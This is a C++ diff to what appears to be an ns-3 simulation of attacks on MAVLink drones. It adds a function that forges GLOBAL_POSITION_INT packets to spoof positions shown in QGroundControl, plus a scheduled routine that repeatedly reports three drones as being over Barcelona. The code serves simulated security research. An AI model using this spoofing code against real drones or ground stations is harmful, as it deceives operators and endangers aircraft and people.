@@ -331,6 +331,35 @@ std::vector<uint8_t> CreateHeartbeatPacket(uint8_t system_id) {
     return std::vector<uint8_t>(buffer, buffer + len);
 }
 
+// Create a MAVLink GLOBAL_POSITION_INT message for QGroundControl spoofing
+std::vector<uint8_t> CreateQgcLocationSpoofPacket(uint8_t system_id, double lat, double lon, double alt) {
+    mavlink_message_t msg;
+    uint8_t component_id = 0;  // Typically 0 for autopilot
+
+    // Calculate time since boot (monotonic)
+    static auto start_time = std::chrono::steady_clock::now();
+    auto now = std::chrono::steady_clock::now();
+    uint32_t time_boot_ms = std::chrono::duration_cast<std::chrono::milliseconds>(now - start_time).count();
+    
+    mavlink_global_position_int_t global_pos = {};
+    global_pos.time_boot_ms = time_boot_ms;
+    global_pos.lat = static_cast<int32_t>(lat * 1e7);  // Latitude in degrees * 1e7
+    global_pos.lon = static_cast<int32_t>(lon * 1e7);  // Longitude in degrees * 1e7
+    global_pos.alt = static_cast<int32_t>(alt * 1000); // Altitude in millimeters
+    global_pos.relative_alt = static_cast<int32_t>(alt * 1000); // Relative altitude in millimeters
+    global_pos.vx = 0;  // Ground X Speed (Latitude, positive north)
+    global_pos.vy = 0;  // Ground Y Speed (Longitude, positive east)
+    global_pos.vz = 0;  // Ground Z Speed (Altitude, positive down)
+    global_pos.hdg = 0; // Vehicle heading (yaw angle) in degrees * 100, 0..359.99 degrees
+
+    mavlink_msg_global_position_int_encode(system_id, component_id, &msg, &global_pos);
+
+    uint8_t buffer[MAVLINK_MAX_PACKET_LEN];
+    uint16_t len = mavlink_msg_to_send_buffer(buffer, &msg);
+    
+    return std::vector<uint8_t>(buffer, buffer + len);
+}
+
 
 // Create a comprehensive set of MAVLink packets to simulate a spoofed drone
 // This function generates a series of MAVLink packets that simulate a drone's presence and status
@@ -781,6 +810,31 @@ void ExecuteSpeedManipulationAttack(Ptr<Socket> socket) {
     }
 }
 
+// Execute drones location spoofing attack
+void ExecuteSpoofDroneGPSAttack(Ptr<Socket> socket) {
+    double Lat = 41.3879;
+    double Lon = 2.16992;
+    double Alt = 60.0;
+
+    // Spoof positions for all drones (system IDs 1, 2, 3) to appear at Barcelona
+    for (uint8_t system_id = 1; system_id <= 3; system_id++) {
+        std::vector<uint8_t> spoofPacket = CreateQgcLocationSpoofPacket(system_id, Lat, Lon, Alt);
+        
+        // Send to ZMQ instead of directly to QGroundControl
+        if (g_commandPublisher) {
+            zmq::message_t zmqMsg(spoofPacket.data(), spoofPacket.size());
+            g_commandPublisher->send(zmqMsg, zmq::send_flags::none);
+        }
+        
+        NS_LOG_INFO("Attacker sent spoofed position for drone " << (int)system_id 
+                    << " to ZMQ at " << Simulator::Now().GetSeconds() << "s");
+    }
+    
+    // Schedule next update (every 0.1 seconds)
+    if (Simulator::Now().GetSeconds() < 180.0) {
+        Simulator::Schedule(Seconds(0.1), &ExecuteSpoofDroneGPSAttack, socket);
+    }
+}
 
 // Execute battery percentage spoofing attack
 void ExecuteBatteryPercentageSpoofingAttack(Ptr<Socket> socket) {
